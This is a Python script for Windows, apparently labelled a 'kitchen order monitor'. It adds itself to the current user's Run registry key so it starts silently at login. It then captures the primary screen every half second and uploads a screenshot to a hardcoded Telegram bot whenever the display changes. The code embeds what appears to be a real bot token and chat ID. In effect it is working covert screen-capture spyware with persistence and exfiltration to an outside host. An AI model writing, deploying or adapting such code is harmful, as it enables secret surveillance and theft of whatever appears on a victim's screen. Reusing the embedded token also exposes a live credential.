import os
import sys
import time
import tempfile
import winreg
from pathlib import Path

import mss
import numpy as np
import requests
from PIL import Image


# ============================================================
# TELEGRAM CONFIGURATION
# ============================================================

# PUT YOUR NEW TELEGRAM BOT TOKEN HERE
TELEGRAM_BOT_TOKEN = "8756129429:AAGeEDxirpp0V4-74R5S0hwK9E6CZMpLTqA"

# PUT YOUR TELEGRAM CHAT ID HERE
TELEGRAM_CHAT_ID = "1299401914"


# ============================================================
# SCREEN CONFIGURATION
# ============================================================

# How often the screen is checked
CHECK_INTERVAL = 0.5

# Percentage of pixels that must change
# 0.02 = 2%
CHANGE_THRESHOLD = 0.02

# Minimum time between Telegram messages
COOLDOWN = 1.0


# ============================================================
# WINDOWS AUTO START
# ============================================================

def add_to_startup():
    """
    Register the EXE to start automatically
    when the current Windows user logs in.

    No Startup-folder shortcut is created.
    """

    try:
        # When compiled with PyInstaller,
        # this points to the EXE.
        exe_path = str(
            Path(sys.executable).resolve()
        )

        registry_path = (
            r"Software\Microsoft\Windows"
            r"\CurrentVersion\Run"
        )

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            registry_path,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(
            key,
            "KitchenOrderMonitor",
            0,
            winreg.REG_SZ,
            f'"{exe_path}"'
        )

        winreg.CloseKey(key)

    except Exception as e:
        print("Startup registration error:", e)


# ============================================================
# TELEGRAM
# ============================================================

def send_to_telegram(image_path):

    if not TELEGRAM_BOT_TOKEN:
        raise RuntimeError(
            "Telegram bot token is missing."
        )

    if not TELEGRAM_CHAT_ID:
        raise RuntimeError(
            "Telegram chat ID is missing."
        )

    url = (
        "https://api.telegram.org/bot"
        f"{TELEGRAM_BOT_TOKEN}/sendPhoto"
    )

    with open(image_path, "rb") as image_file:

        response = requests.post(
            url,
            data={
                "chat_id": TELEGRAM_CHAT_ID
            },
            files={
                "photo": image_file
            },
            timeout=20
        )

    response.raise_for_status()


# ============================================================
# SCREEN CAPTURE
# ============================================================

def capture_screen(sct, monitor):

    screenshot = sct.grab(monitor)

    # Convert screenshot to NumPy array.
    # mss returns BGRA; first three channels are used.
    frame = np.array(
        screenshot
    )[:, :, :3]

    return frame


# ============================================================
# PIXEL DIFFERENCE
# ============================================================

def screen_changed(previous, current):

    difference = np.abs(
        current.astype(np.int16)
        - previous.astype(np.int16)
    )

    # Ignore tiny changes.
    changed_pixels = np.any(
        difference > 25,
        axis=2
    )

    changed_percentage = (
        changed_pixels.mean()
    )

    return (
        changed_percentage
        >= CHANGE_THRESHOLD
    )


# ============================================================
# SCREENSHOT
# ============================================================

def save_screenshot(sct, monitor):

    screenshot = sct.grab(monitor)

    file_descriptor, file_path = tempfile.mkstemp(
        suffix=".png",
        prefix="kitchen_order_"
    )

    os.close(file_descriptor)

    image = Image.frombytes(
        "RGB",
        screenshot.size,
        screenshot.rgb
    )

    image.save(
        file_path,
        "PNG"
    )

    return file_path


# ============================================================
# SCREEN MONITOR
# ============================================================

def monitor_screen():

    # New mss syntax
    with mss.MSS() as sct:

        # Primary monitor
        monitor = sct.monitors[1]

        # Take initial screenshot
        previous = capture_screen(
            sct,
            monitor
        )

        last_sent = 0

        while True:

            time.sleep(
                CHECK_INTERVAL
            )

            current = capture_screen(
                sct,
                monitor
            )

            # No significant change
            if not screen_changed(
                previous,
                current
            ):

                previous = current
                continue

            now = time.time()

            # Prevent repeated messages
            if (
                now - last_sent
                < COOLDOWN
            ):

                previous = current
                continue

            image_path = None

            try:

                # Capture current screen
                image_path = save_screenshot(
                    sct,
                    monitor
                )

                # Send to Telegram
                send_to_telegram(
                    image_path
                )

                last_sent = now

            except Exception as e:

                # Useful while testing
                print(
                    "Telegram error:",
                    e
                )

            finally:

                # Delete temporary screenshot
                if (
                    image_path
                    and os.path.exists(
                        image_path
                    )
                ):

                    try:
                        os.remove(
                            image_path
                        )

                    except OSError:
                        pass

            previous = current


# ============================================================
# MAIN
# ============================================================

def main():

    # Register EXE for Windows startup
    add_to_startup()

    # Start monitoring
    monitor_screen()


if __name__ == "__main__":
    main()